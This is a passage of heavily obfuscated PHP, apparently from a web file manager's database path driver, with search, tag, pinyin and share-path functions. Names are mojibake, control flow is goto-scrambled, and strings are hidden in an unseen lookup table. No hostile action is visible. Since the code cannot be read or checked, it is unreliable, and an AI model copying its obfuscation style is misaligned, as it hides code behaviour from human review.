$d«Íä›Ìµ); goto Cá®Ïœó¢; b¨¹¤‰ƒ¸÷: $d«Íä›Ìµ = $EÀ¿ĞÒÌÈ; if (!isset($EÀ¿ĞÒÌÈ[$CˆåïØì[434]])) { $EÀ¿ĞÒÌÈ[$CˆåïØì[434]] = 0; } $cæÓ„ùƒ¬ì = $CˆåïØì[1965]; goto aÂ·ƒòŠ¾ô; eõŸ¼ñÃùø: $this->_listDataApply($fĞ¸†ˆ[$CˆåïØì[377]]); $this->_listMake($fĞ¸†ˆ); return $fĞ¸†ˆ; goto fİÌëÙê; fİÌëÙê: } private function _listSearchFileContent(&$C™Ë ‘ï»ã, $b¾‰±À‰ŠÔ, $dôç˜ÀÑÅº, $BãˆìŞµ) { goto F×ĞªîØÃÇ; F×ĞªîØÃÇ: $EÈÊˆÒ­íõ =& $_SERVER[œÕÊİğö]; if (!$b¾‰±À‰ŠÔ[$EÈÊˆÒ­íõ[1808]] || $C™Ë ‘ï»ã[$EÈÊˆÒ­íõ[374]][$EÈÊˆÒ­íõ[361]] > 1) { return; } if (!isset($BãˆìŞµ[$EÈÊˆÒ­íõ[38]]) || !is_array($b¾‰±À‰ŠÔ[$EÈÊˆÒ­íõ[470]])) { return; } goto Bğ±Ø½òë; Bğ±Ø½òë: $BãˆìŞµ[$EÈÊˆÒ­íõ[470]] = array($EÈÊˆÒ­íõ[7], $b¾‰±À‰ŠÔ[$EÈÊˆÒ­íõ[470]]); unset($BãˆìŞµ[$EÈÊˆÒ­íõ[38]]); unset($b¾‰±À‰ŠÔ[$EÈÊˆÒ­íõ[470]]); goto cİ„ÒŒÉÊŠ; cİ„ÒŒÉÊŠ: $BÌêÑ´Ï—¿ = $this->field($dôç˜ÀÑÅº)->where($BãˆìŞµ)->limit($EÈÊˆÒ­íõ[1966])->select(); if (!$BÌêÑ´Ï—¿ || count($BÌêÑ´Ï—¿) == 0) { return; } $C™Ë ‘ï»ã[$EÈÊˆÒ­íõ[377]] = array_merge($BÌêÑ´Ï—¿, $C™Ë ‘ï»ã[$EÈÊˆÒ­íõ[377]]); goto fÅš´”šç; fÅš´”šç: $C™Ë ‘ï»ã[$EÈÊˆÒ­íõ[374]][$EÈÊˆÒ­íõ[375]] += count($BÌêÑ´Ï—¿); goto e‚Ó£Ï§Ø; e‚Ó£Ï§Ø: } private function _listSearchTag(&$fè½”¢ëÚ‘, $fŒ™¤Õí‡ª, $Dˆ½å®²ó) { goto F‘£Ù…ƒ£•; cš—•™³ÎÌ: $fí†ÒØ²‡¼ = array_to_keyvalue($fí†ÒØ²‡¼, $aæĞø¤èƒá[43], $aæĞø¤èƒá[86]); $b¼ãÑõàä = array_unique($fí†ÒØ²‡¼); $this->_listSearchMerge($fè½”¢ëÚ‘, $fŒ™¤Õí‡ª, $Dˆ½å®²ó, $b¼ãÑõàä); goto BóÇØİó²İ; F‘£Ù…ƒ£•: $aæĞø¤èƒá =& $_SERVER[œÕÊİğö]; if (!$fŒ™¤Õí‡ª[$aæĞø¤èƒá[1808]] || $fè½”¢ëÚ‘[$aæĞø¤èƒá[374]][$aæĞø¤èƒá[361]] > 1) { return; } $Bï®­ë‹­¼ = Model($aæĞø¤èƒá[1967])->listData(); goto C÷™Ë’İ¶; CïÁùØë±Ó: if (!$eìÛÂ´ÄÒ—) { return; } $bê‚î‹×Šœ = array($aæĞø¤èƒá[430] => array($aæĞø¤èƒá[7], $eìÛÂ´ÄÒ—), $aæĞø¤èƒá[1551] => USER_ID); $fí†ÒØ²‡¼ = Model($aæĞø¤èƒá[431])->field($aæĞø¤èƒá[86])->where($bê‚î‹×Šœ)->select(); goto cš—•™³ÎÌ; C÷™Ë’İ¶: $eìÛÂ´ÄÒ— = array(); $c¿ö‚á¯›„ = $fŒ™¤Õí‡ª[$aæĞø¤èƒá[1808]]; foreach ($Bï®­ë‹­¼ as $cƒ´¦òÅ‚è) { $Aè·ÏŸÀîì = $cƒ´¦òÅ‚è[$aæĞø¤èƒá[38]]; $BÏ×¶Ó˜¾Á = str_replace($aæĞø¤èƒá[60], $aæĞø¤èƒá[43], Pinyin::get($Aè·ÏŸÀîì)); if (stripos($Aè·ÏŸÀîì, $c¿ö‚á¯›„) !== !1 || stripos($BÏ×¶Ó˜¾Á, $c¿ö‚á¯›„) !== !1) { $eìÛÂ´ÄÒ—[] = $cƒ´¦òÅ‚è[$aæĞø¤èƒá[404]]; } } goto CïÁùØë±Ó; BóÇØİó²İ: } private function _listSearchDesc(&$eºèË‚©ŸË, $Dæí…¡‰ÈÂ, $eÉ¤ùàñ¹±) { goto FŸèÕÙ¡Ë; FÎ¯¦©öÑà: $AÀˆ¤¦Ñò¿ = array_unique($AÀˆ¤¦Ñò¿); if (!$AÀˆ¤¦Ñò¿) { return; } $bœ˜¨¯×’— = array($E¯ö§¿ù[406] => array($E¯ö§¿ù[7], $AÀˆ¤¦Ñò¿), $E¯ö§¿ù[103] => $E¯ö§¿ù[454], $E¯ö§¿ù[382] => array($E¯ö§¿ù[390], $E¯ö§¿ù[1810] . $Dæí…¡‰ÈÂ[$E¯ö§¿ù[1808]] . $E¯ö§¿ù[1810])); goto C‚à‡Ğ›£Å; C‚à‡Ğ›£Å: $A”º…ï›—Ã = Model($E¯ö§¿ù[566])->field($E¯ö§¿ù[406])->where($bœ˜¨¯×’—)->select(); $Eß…áù½„ = array_to_keyvalue($A”º…ï›—Ã, $E¯ö§¿ù[43], $E¯ö§¿ù[406]); $this->_listSearchMerge($eºèË‚©ŸË, $Dæí…¡‰ÈÂ, $eÉ¤ùàñ¹±, $Eß…áù½„); goto E „¡ÌÕ²ç; FŸèÕÙ¡Ë: $E¯ö§¿ù =& $_SERVER[œÕÊİğö]; if (!$Dæí…¡‰ÈÂ[$E¯ö§¿ù[1808]] || $eºèË‚©ŸË[$E¯ö§¿ù[374]][$E¯ö§¿ù[361]] > 1) { return; } $AÀˆ¤¦Ñò¿ = $this->listSearchChildren($Dæí…¡‰ÈÂ[$E¯ö§¿ù[501]]); goto FÎ¯¦©öÑà; E „¡ÌÕ²ç: } private function _listSearchGroupTag(&$D‘ƒ§Üò„¯, $A­’‚ÊŠ’, $A”ò©—ğ¡ˆ) { goto Ağ¨Ğİç­; F†ô¡õğŠ…: $e»êœÓ¨ù´ = array(); $DŒßİ©¨ì• = $A­’‚ÊŠ’[$A…¥·Òê¾[1808]]; foreach ($Fíˆ™ù[$A…¥·Òê¾[377]] as $f²Â÷áÇ†º) { $F¹Š†õ± = $f²Â÷áÇ†º[$A…¥·Òê¾[38]]; $D˜¬Éƒ…ôò = str_replace($A…¥·Òê¾[60], $A…¥·Òê¾[43], Pinyin::get($F¹Š†õ±)); if (stripos($F¹Š†õ±, $DŒßİ©¨ì•) !== !1 || stripos($D˜¬Éƒ…ôò, $DŒßİ©¨ì•) !== !1) { $e»êœÓ¨ù´[] = $f²Â÷áÇ†º[$A…¥·Òê¾[404]]; } } goto bŒÆ‚ë¸×ª; Ağ¨Ğİç­: $A…¥·Òê¾ =& $_SERVER[œÕÊİğö]; if (!$A­’‚ÊŠ’[$A…¥·Òê¾[1808]] || $D‘ƒ§Üò„¯[$A…¥·Òê¾[374]][$A…¥·Òê¾[361]] > 1 || !$A­’‚ÊŠ’[$A…¥·Òê¾[501]]) { return; } $fƒŒÂåêç½ = $this->sourceInfo($A­’‚ÊŠ’[$A…¥·Òê¾[501]]); goto e¦ÊïÉ‚Ó‡; d¤Üùƒñî—: $c¿…ƒÌ…‰ = array_to_keyvalue($c¿…ƒÌ…‰, $A…¥·Òê¾[43], $A…¥·Òê¾[86]); $aŒ×›¹Œì« = array_unique($c¿…ƒÌ…‰); $this->_listSearchMerge($D‘ƒ§Üò„¯, $A­’‚ÊŠ’, $A”ò©—ğ¡ˆ, $aŒ×›¹Œì«); goto Bé—¢ñêÇ; e¦ÊïÉ‚Ó‡: if (!$fƒŒÂåêç½ || $fƒŒÂåêç½[$A…¥·Òê¾[415]] != SourceModel::TYPE_GROUP) { return; } $fÖ¢İÕ¨ = $fƒŒÂåêç½[$A…¥·Òê¾[507]]; $Fíˆ™ù = Model($A…¥·Òê¾[1968])->get($fÖ¢İÕ¨); goto F†ô¡õğŠ…; bŒÆ‚ë¸×ª: if (!$e»êœÓ¨ù´) { return; } $eÓòÑè±²£ = array($A…¥·Òê¾[430] => array($A…¥·Òê¾[7], $e»êœÓ¨ù´), $A…¥·Òê¾[1551] => 0, $A…¥·Òê¾[39] => $A…¥·Òê¾[1832] . $fÖ¢İÕ¨); $c¿…ƒÌ…‰ = Model($A…¥·Òê¾[431])->field($A…¥·Òê¾[86])->where($eÓòÑè±²£)->select(); goto d¤Üùƒñî—; Bé—¢ñêÇ: } private function _listSearchMerge(&$C‡¨ƒÛ—Ùõ, $F¦æËòŒ“, $fÏÅß¾æ•, $eÁô³ÇïÇ­) { goto Fò†ÃÜÁËÎ; BÑíé‡÷®ù: $B±†¬í­Á± = array_diff($eÁô³ÇïÇ­, $BÓÉŒ¾±Ÿ); if (!$B±†¬í­Á±) { return; } $dí†Ñäˆ³ = array($C‹²¬¼¼‡¸[406] => array($C‹²¬¼¼‡¸[7], $B±†¬í­Á±)); goto aÕ†—Î Åß; Fò†ÃÜÁËÎ: $C‹²¬¼¼‡¸ =& $_SERVER[œÕÊİğö]; if (!$eÁô³ÇïÇ­) { return; } $BÓÉŒ¾±Ÿ = array_to_keyvalue($C‡¨ƒÛ—Ùõ[$C‹²¬¼¼‡¸[377]], $C‹²¬¼¼‡¸[43], $C‹²¬¼¼‡¸[406]); goto BÑíé‡÷®ù; c‹Ÿ… ´İ: foreach ($D„Œ…†ëÁë as $A Ø°Ç¡Ê´) { if ($this->_listSearchFilter($A Ø°Ç¡Ê´, $F¦æËòŒ“)) { $b®çïá„ß[] = $A Ø°Ç¡Ê´; } } $C‡¨ƒÛ—Ùõ[$C‹²¬¼¼‡¸[377]] = array_merge($b®çïá„ß, $C‡¨ƒÛ—Ùõ[$C‹²¬¼¼‡¸[377]]); $C‡¨ƒÛ—Ùõ[$C‹²¬¼¼‡¸[374]][$C‹²¬¼¼‡¸[375]] += count($b®çïá„ß); goto AÊÃíï‚´; aÕ†—Î Åß: $D„Œ…†ëÁë = $this->field($fÏÅß¾æ•)->where($dí†Ñäˆ³)->select(); if (!$D„Œ…†ëÁë) { return; } $b®çïá„ß = array(); goto c‹Ÿ… ´İ; AÊÃíï‚´: } private function _listSearchFilter($A¬ĞÌõ‰•ˆ, $FŞ¤¡§ Ù) { goto f¸ÇŠ¤¢¾; E¬´êÒ‹ƒœ: if (isset($FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[416]]) && $FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[416]] != $EÙ¡ªÒä³Œ[1774]) { if ($FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[416]] == $EÙ¡ªÒä³Œ[87] && !$fÌ°Œ›–†­) { return !1; } if ($FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[416]] != $EÙ¡ªÒä³Œ[87] && $fÌ°Œ›–†­) { return !1; } if (!strstr($A¬ĞÌõ‰•ˆ[$EÙ¡ªÒä³Œ[178]], $EÙ¡ªÒä³Œ[57] . $FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[416]] . $EÙ¡ªÒä³Œ[57])) { return !1; } } if (isset($FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[1969]]) && $FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[1969]] < $A¬ĞÌõ‰•ˆ[$EÙ¡ªÒä³Œ[88]]) { return !1; } if (isset($FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[1970]]) && $FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[1970]] > $A¬ĞÌõ‰•ˆ[$EÙ¡ªÒä³Œ[88]]) { return !1; } goto DÍ±òÂ›¸‘; f¸ÇŠ¤¢¾: $EÙ¡ªÒä³Œ =& $_SERVER[œÕÊİğö]; $fÌ°Œ›–†­ = $A¬ĞÌõ‰•ˆ[$EÙ¡ªÒä³Œ[414]] == $EÙ¡ªÒä³Œ[97]; if (!strstr($A¬ĞÌõ‰•ˆ[$EÙ¡ªÒä³Œ[524]], $EÙ¡ªÒä³Œ[57] . $FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[501]] . $EÙ¡ªÒä³Œ[57])) { return !1; } goto E¬´êÒ‹ƒœ; DÍ±òÂ›¸‘: if (isset($FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[597]]) && $FŞ¤¡§ Ù[$EÙ¡ªÒä³Œ[597]] != $A¬ĞÌõ‰•ˆ[$EÙ¡ªÒä³Œ[457]]) { return !1; } return !0; goto D¾“ˆÃ‘Ø˜; D¾“ˆÃ‘Ø˜: } public function listSearchChildren($Aïéó×¨õŒ, $E…¢Ëø†Œ = 5000) { goto FÀÄ¥Ù‚î‰; d¾•ÛÒ³¤: $AİÑ±™ÃÜ = array($E«ãò’‡µ´[524] => array($E«ãò’‡µ´[390], $DÜÅÊ„æ¿¤[$E«ãò’‡µ´[524]] . $DÜÅÊ„æ¿¤[$E«ãò’‡µ´[406]] . $E«ãò’‡µ´[548])); $d¤÷ğ¸§‡ = $this->field($E«ãò’‡µ´[406])->cache(null, 600)->where($AİÑ±™ÃÜ)->count(); if ($d¤÷ğ¸§‡ > $E…¢Ëø†Œ) { return $this->_listSearchChildrenNear($Aïéó×¨õŒ, $E…¢Ëø†Œ); } goto D…Ã†Û½Ğ‡; D…Ã†Û½Ğ‡: $e‰Õ Ä‚‘Â = $this->field($E«ãò’‡µ´[406])->where($AİÑ±™ÃÜ)->select(); $B×¶œà ’ = array_to_keyvalue($e‰Õ Ä‚‘Â, $E«ãò’‡µ´[43], $E«ãò’‡µ´[406]); return $B×¶œà ’; goto D“æéô¾»‰; FÀÄ¥Ù‚î‰: $E«ãò’‡µ´ =& $_SERVER[œÕÊİğö]; $B×¶œà ’ = array(); $DÜÅÊ„æ¿¤ = $this->sourceInfo($Aïéó×¨õŒ); goto d¾•ÛÒ³¤; D“æéô¾»‰: } private function _listSearchChildrenNear($F°ƒ…¬ÖŸ», $fÚ¿ĞŞ£øˆ) { goto E¨¤Ìˆ¢Ñ¢; aÛ½ò³„°Ú: $d¯èÛ¾¦Ó = $this->field($d¡õÅÓ¥à¸[1971])->where($C—‰«á£“Æ)->select(); $Fì¤‘¶Œƒ¿ = array_to_keyvalue(array_filter_by_field($d¯èÛ¾¦Ó, $d¡õÅÓ¥à¸[414], $d¡õÅÓ¥à¸[97]), $d¡õÅÓ¥à¸[43], $d¡õÅÓ¥à¸[406]); $E‹»“‹¯ÅÌ = array_merge($E‹»“‹¯ÅÌ, array_to_keyvalue($d¯èÛ¾¦Ó, $d¡õÅÓ¥à¸[43], $d¡õÅÓ¥à¸[406])); goto C”‰ø… £‘; CºŞÍ¾Ò‘›: $E‹»“‹¯ÅÌ = array_merge($E‹»“‹¯ÅÌ, array_to_keyvalue($d¯èÛ¾¦Ó, $d¡õÅÓ¥à¸[43], $d¡õÅÓ¥à¸[406])); $E‹»“‹¯ÅÌ = array_slice($E‹»“‹¯ÅÌ, 0, $fÚ¿ĞŞ£øˆ); return $E‹»“‹¯ÅÌ; goto f´‡¤ Ñî‡; C”‰ø… £‘: if (!$Fì¤‘¶Œƒ¿) { return $E‹»“‹¯ÅÌ; } $C—‰«á£“Æ = array($d¡õÅÓ¥à¸[501] => array($d¡õÅÓ¥à¸[7], $Fì¤‘¶Œƒ¿)); $d¯èÛ¾¦Ó = $this->field($d¡õÅÓ¥à¸[1971])->where($C—‰«á£“Æ)->limit($fÚ¿ĞŞ£øˆ)->select(); goto CºŞÍ¾Ò‘›; E¨¤Ìˆ¢Ñ¢: $d¡õÅÓ¥à¸ =& $_SERVER[œÕÊİğö]; $E‹»“‹¯ÅÌ = array(); $C—‰«á£“Æ = array($d¡õÅÓ¥à¸[501] => $F°ƒ…¬ÖŸ»); goto aÛ½ò³„°Ú; f´‡¤ Ñî‡: } private function _listSearchBindPinyin($b¶óŒçãË, &$EŠ´ğ‘÷ğä, &$EÏÁÇªÄŠ) { goto F¡†…õ­âå; E÷Õ¬÷ØæÏ: $EÏÁÇªÄŠ = $bµˆ™•ñÇñ[439] . str_replace($bµˆ™•ñÇñ[57], $bµˆ™•ñÇñ[440], $EÏÁÇªÄŠ); $fÃ§µ£‹Ú = $EŠ´ğ‘÷ğä[$bµˆ™•ñÇñ[38]]; unset($EŠ´ğ‘÷ğä[$bµˆ™•ñÇñ[38]]); goto d¾„ÓôïºÚ; d¾„ÓôïºÚ: foreach ($EŠ´ğ‘÷ğä as $F¼Óè«¸’ñ => $AÎ³ö¦Ÿ·‚) { $e¯óÍ­éŸ[$bµˆ™•ñÇñ[439] . $F¼Óè«¸’ñ] = $AÎ³ö¦Ÿ·‚; } foreach ($fÃ§µ£‹Ú as $B·«Âğõ¨) { $e¯óÍ­éŸ[] = array($bµˆ™•ñÇñ[444] => $B·«Âğõ¨, $bµˆ™•ñÇñ[981] => $bµˆ™•ñÇñ[1812], array($bµˆ™•ñÇñ[1973] => $B·«Âğõ¨, $bµˆ™•ñÇñ[1974] => array($bµˆ™•ñÇñ[7], array($bµˆ™•ñÇñ[467], $bµˆ™•ñÇñ[466])))); } $this->join($BÎ–‹ååäÑ); goto B¾ò¢İÆÀ; B¾ò¢İÆÀ: $EŠ´ğ‘÷ğä = $e¯óÍ­éŸ; goto cÉùÏ×Ô±Ç; F¡†…õ­âå: $bµˆ™•ñÇñ =& $_SERVER[œÕÊİğö]; if (!isset($b¶óŒçãË[$bµˆ™•ñÇñ[1808]]) || !$b¶óŒçãË[$bµˆ™•ñÇñ[1808]]) { return; } if (!Input::check($b¶óŒçãË[$bµˆ™•ñÇñ[1808]], $bµˆ™•ñÇñ[326]) || strlen($b¶óŒçãË[$bµˆ™•ñÇñ[1808]]) < 2) { return; } goto e‘ˆ»‘Õå; e‘ˆ»‘Õå: $BÎ–‹ååäÑ = "\114\105\106\x54\x20\112\x4f\111\x4e\40{$this->tablePrefix}\151\157\x5f\163\x6f\165\x72\143\x65\x5f\155\x65\164\141\40\155\145\164\x61\x20\157\x6e\x20\x73\157\x75\162\143\145\x2e\163\x6f\165\162\x63\x65\x49\104\40\75\40\155\x65\x74\141\56\163\157\x75\162\143\x65\111\104"; $e¯óÍ­éŸ = array(); $EÏÁÇªÄŠ = str_replace(array($bµˆ™•ñÇñ[15], $bµˆ™•ñÇñ[60], $bµˆ™•ñÇñ[1972]), $bµˆ™•ñÇñ[43], $EÏÁÇªÄŠ); goto E÷Õ¬÷ØæÏ; cÉùÏ×Ô±Ç: } private function _parseSearchWhere($CÆ–±ø‚¸Ü) { goto Fƒäá§Œºø; Fƒäá§Œºø: $A½Ë…Ó® =& $_SERVER[œÕÊİğö]; $fñ¿½Ä‹…á = array(); if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[751]]) && $CÆ–±ø‚¸Ü[$A½Ë…Ó®[751]]) { $fñ¿½Ä‹…á[$A½Ë…Ó®[94]] = array($A½Ë…Ó®[1975], $CÆ–±ø‚¸Ü[$A½Ë…Ó®[751]]); } goto B‹…æ£—£²; EšÚäº°Ôˆ: if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[597]]) && $CÆ–±ø‚¸Ü[$A½Ë…Ó®[597]]) { $fñ¿½Ä‹…á[] = array($A½Ë…Ó®[457] => $CÆ–±ø‚¸Ü[$A½Ë…Ó®[597]], $A½Ë…Ó®[455] => $CÆ–±ø‚¸Ü[$A½Ë…Ó®[597]], $A½Ë…Ó®[981] => $A½Ë…Ó®[1812]); } if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[416]]) && $CÆ–±ø‚¸Ü[$A½Ë…Ó®[416]]) { $c„ÙÂî¯“„ = $CÆ–±ø‚¸Ü[$A½Ë…Ó®[416]]; if ($c„ÙÂî¯“„ == $A½Ë…Ó®[87]) { $fñ¿½Ä‹…á[$A½Ë…Ó®[414]] = 1; } else { if ($c„ÙÂî¯“„ == $A½Ë…Ó®[1978]) { $fñ¿½Ä‹…á[$A½Ë…Ó®[414]] = 0; } else { if ($c„ÙÂî¯“„) { $c„ÙÂî¯“„ = is_array($c„ÙÂî¯“„) ? $c„ÙÂî¯“„ : explode($A½Ë…Ó®[57], $c„ÙÂî¯“„); $fñ¿½Ä‹…á[$A½Ë…Ó®[416]] = array($A½Ë…Ó®[422], $c„ÙÂî¯“„); $fñ¿½Ä‹…á[$A½Ë…Ó®[414]] = 0; } } } } $this->_parseSearchParent($CÆ–±ø‚¸Ü, $fñ¿½Ä‹…á); goto DÎ¨À“¤îÇ; B‹…æ£—£²: if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[499]]) && $CÆ–±ø‚¸Ü[$A½Ë…Ó®[499]]) { $B–†óÏå—› = array($A½Ë…Ó®[1976], $CÆ–±ø‚¸Ü[$A½Ë…Ó®[499]]); if ($fñ¿½Ä‹…á[$A½Ë…Ó®[94]]) { $fñ¿½Ä‹…á[$A½Ë…Ó®[94]] = array($fñ¿½Ä‹…á[$A½Ë…Ó®[94]], $B–†óÏå—›, $A½Ë…Ó®[1977]); } else { $fñ¿½Ä‹…á[$A½Ë…Ó®[94]] = $B–†óÏå—›; } } if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[1969]]) && $CÆ–±ø‚¸Ü[$A½Ë…Ó®[1969]] > 0) { $fñ¿½Ä‹…á[$A½Ë…Ó®[88]] = array($A½Ë…Ó®[1975], $CÆ–±ø‚¸Ü[$A½Ë…Ó®[1969]]); } if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[1970]]) && $CÆ–±ø‚¸Ü[$A½Ë…Ó®[1970]]) { $B–†óÏå—› = array($A½Ë…Ó®[1976], $CÆ–±ø‚¸Ü[$A½Ë…Ó®[1970]]); if ($fñ¿½Ä‹…á[$A½Ë…Ó®[88]]) { $fñ¿½Ä‹…á[$A½Ë…Ó®[88]] = array($fñ¿½Ä‹…á[$A½Ë…Ó®[88]], $B–†óÏå—›, $A½Ë…Ó®[1977]); } else { $fñ¿½Ä‹…á[$A½Ë…Ó®[88]] = $B–†óÏå—›; } } goto EšÚäº°Ôˆ; DÎ¨À“¤îÇ: if (isset($CÆ–±ø‚¸Ü[$A½Ë…Ó®[1808]]) && trim($CÆ–±ø‚¸Ü[$A½Ë…Ó®[1808]])) { $eœ‡‡‚µ = trim($CÆ–±ø‚¸Ü[$A½Ë…Ó®[1808]]); $e„¡Ù¾ö¹® = explode($A½Ë…Ó®[60], $eœ‡‡‚µ); if (strlen($eœ‡‡‚µ) > 2 && (substr($eœ‡‡‚µ, 0, 1) == $A½Ë…Ó®[126] && substr($eœ‡‡‚µ, -1) == $A½Ë…Ó®[126]) || substr($eœ‡‡‚µ, 0, 1) == $A½Ë…Ó®[65] && substr($eœ‡‡‚µ, -1) == $A½Ë…Ó®[65]) { $eœ‡‡‚µ = substr($eœ‡‡‚µ, 1, -1); $e„¡Ù¾ö¹® = array($eœ‡‡‚µ); } $fñ¿½Ä‹…á[$A½Ë…Ó®[38]] = array(array($A½Ë…Ó®[547], $A½Ë…Ó®[1810] . $eœ‡‡‚µ . $A½Ë…Ó®[1810])); if (count($e„¡Ù¾ö¹®) > 1) { $fñ¿½Ä‹…á[$A½Ë…Ó®[38]] = array(); foreach ($e„¡Ù¾ö¹® as $DÍâÎËÁŠ) { if (!trim($DÍâÎËÁŠ)) { continue; } $fñ¿½Ä‹…á[$A½Ë…Ó®[38]][] = array($A½Ë…Ó®[547], $A½Ë…Ó®[1810] . trim($DÍâÎËÁŠ) . $A½Ë…Ó®[1810]); } } } return $fñ¿½Ä‹…á; goto B­Ü‡ª©ïá; B­Ü‡ª©ïá: } private function _parseSearchParent($dº«™‰Œéº, &$e‡¢Í³”å¾) { goto AÜÆ†í¸Û¤; a£ôâŠÎÆğ: $f£ºÉĞØ†‰ = $A³Ë¶İø¸[$DŒ“‰ò½ÊÔ[507]] . $DŒ“‰ò½ÊÔ[43]; if ($f£ºÉĞØ†‰ == $DŒ“‰ò½ÊÔ[97]) { unset($e‡¢Í³”å¾[$DŒ“‰ò½ÊÔ[587]]); $e‡¢Í³”å¾[$DŒ“‰ò½ÊÔ[415]] = self::TYPE_GROUP; return; } $F¼Öì¯«Ì­ = Model($DŒ“‰ò½ÊÔ[525])->groupChildrenAll($f£ºÉĞØ†‰); goto D–°ÕŒÃœ; bîÌ£ª¤İò: $AŠÚ‹ª²Ì¬ = isset($dº«™‰Œéº[$DŒ“‰ò½ÊÔ[1676]]) && in_array($DŒ“‰ò½ÊÔ[518], $dº«™‰Œéº[$DŒ“‰ò½ÊÔ[1676]]); if (!$AŠÚ‹ª²Ì¬ || !$Fåß£¿ééß || !$cˆ‘Ñ¹Óåç || !$A³Ë¶İø¸[$DŒ“‰ò½ÊÔ[417]]) { return; } if (!AuthModel::authCheckRoot($A³Ë¶İø¸[$DŒ“‰ò½ÊÔ[417]][$DŒ“‰ò½ÊÔ[418]])) { return; } goto a£ôâŠÎÆğ; AÜÆ†í¸Û¤: $DŒ“‰ò½ÊÔ =& $_SERVER[œÕÊİğö]; if (!isset($dº«™‰Œéº[$DŒ“‰ò½ÊÔ[501]]) || !$dº«™‰Œéº[$DŒ“‰ò½ÊÔ[501]]) { return; } $A³Ë¶İø¸ = $this->pathInfo($dº«™‰Œéº[$DŒ“‰ò½ÊÔ[501]]); goto D÷éïá½ÀÚ; f±ÇàÕä¥÷: $e‡¢Í³”å¾[$DŒ“‰ò½ÊÔ[587]][] = $DŒ“‰ò½ÊÔ[1812]; goto Féƒƒö‰Ÿî; D÷éïá½ÀÚ: $cˆ‘Ñ¹Óåç = $A³Ë¶İø¸[$DŒ“‰ò½ÊÔ[501]] . $DŒ“‰ò½ÊÔ[43] === $DŒ“‰ò½ÊÔ[201]; $Fåß£¿ééß = $A³Ë¶İø¸[$DŒ“‰ò½ÊÔ[415]] == $DŒ“‰ò½ÊÔ[518]; $e‡¢Í³”å¾[$DŒ“‰ò½ÊÔ[587]] = array($DŒ“‰ò½ÊÔ[547], $A³Ë¶İø¸[$DŒ“‰ò½ÊÔ[524]] . $dº«™‰Œéº[$DŒ“‰ò½ÊÔ[501]] . $DŒ“‰ò½ÊÔ[548]); goto bîÌ£ª¤İò; D–°ÕŒÃœ: $eŒŠÛàĞØ = count($F¼Öì¯«Ì­); if ($eŒŠÛàĞØ <= 1) { return; } $eÅÎ‚÷×± = array($DŒ“‰ò½ÊÔ[501] => 0, $DŒ“‰ò½ÊÔ[415] => self::TYPE_GROUP, $DŒ“‰ò½ÊÔ[507] => array($DŒ“‰ò½ÊÔ[7], $F¼Öì¯«Ì­)); goto CöõÔøìğ„; CöõÔøìğ„: $eç¸×¨Í©ç = $this->field($DŒ“‰ò½ÊÔ[1979])->where($eÅÎ‚÷×±)->limit($eŒŠÛàĞØ)->select(); $e‡¢Í³”å¾[$DŒ“‰ò½ÊÔ[587]] = array(); foreach ($eç¸×¨Í©ç as $B–˜±„ä‘ò) { $e‡¢Í³”å¾[$DŒ“‰ò½ÊÔ[587]][] = array($DŒ“‰ò½ÊÔ[547], $DŒ“‰ò½ÊÔ[534] . $B–˜±„ä‘ò[$DŒ“‰ò½ÊÔ[406]] . $DŒ“‰ò½ÊÔ[548]); } goto f±ÇàÕä¥÷; Féƒƒö‰Ÿî: } } goto bÈÈŞá´”É; A³Æ•‹†Şã: class PathDriverDbShareItem extends PathDriverDB { public function __construct($a™‘™»Ï) { $this->pathParse = $a™‘™»Ï; $this->model = Model($_SERVER[œÕÊİğö][1228]); } public function getPathOuter($b‰˜ÕĞ‚) { $böó¹µ£æë =& $_SERVER[œÕÊİğö]; if (!$b‰˜ÕĞ‚) { return $b‰˜ÕĞ‚; } $eã²Èã‘»œ = $this->parse($b‰˜ÕĞ‚); return trim(KodIO::makeShare($this->pathParse[$böó¹µ£æë[404]], $eã²Èã‘»œ[$böó¹µ£æë[404]]), $böó¹µ£æë[8]); } protected function infoParse($D­§ª‡êÖÌ, $eìÑ­‘âÜ = false, $cÈæç®Š¾ã = false) { $eïö¢­¢• =& $_SERVER[œÕÊİğö]; $e„ØµÃõ = $this->pathParse[$eïö¢­¢•[404]]; $Aˆˆ»ˆŒì³ = trim($this->pathParse[$eïö¢­¢•[1086]], $eïö¢­¢•[8]); return Action($eïö¢­¢•[1236])->sharePathInfo($e„ØµÃõ, $Aˆˆ»ˆŒì³); } public function infoFull($F…Ÿ¥À²“À) { $f†“³¡áæ¸ =& $_SERVER[œÕÊİğö]; $bâÇ††ÖÌÂ = explode($f†“³¡áæ¸[8], trim($F…Ÿ¥À²“À, $f†“³¡áæ¸[8])); if (count($bâÇ††ÖÌÂ) > 1) { $e­”¿Í«£Ó = implode($f†“³¡áæ¸[8], array_splice($bâÇ††ÖÌÂ, 1)); $EÉô¾õ±Ù„ = $this->model->pathInfoByPath($bâÇ††ÖÌÂ[0], $e­”¿Í«£Ó); if (!$EÉô¾õ±Ù„) { return !1; } $this->pathParse[$f†“³¡áæ¸[1086]] = $EÉô¾õ±Ù„[$f†“³¡áæ¸[406]]; } return $this->infoParse($F…Ÿ¥À²“À); } public function listAll($FÖ§ìÜˆ£ê) { goto e‚¼¯ò¥ï; AˆÑ„¢‡áØ: $bº‹çÛ–‡ = $this->model->listAll($FÖ§ìÜˆ£ê); $Cììö£Œ“ = Model($bš¯§©ï¯[598])->getInfo($f¸¥¿ÆÕÅŒ[$bš¯§©ï¯[491]]); $A¾¿¦…îŠ¿ = Action($bš¯§©ï¯[1236]); goto F²ÒÃÖô¦¿; e‚¼¯ò¥ï: $bš¯§©ï¯ =& $_SERVER[œÕÊİğö]; $f¸¥¿ÆÕÅŒ = 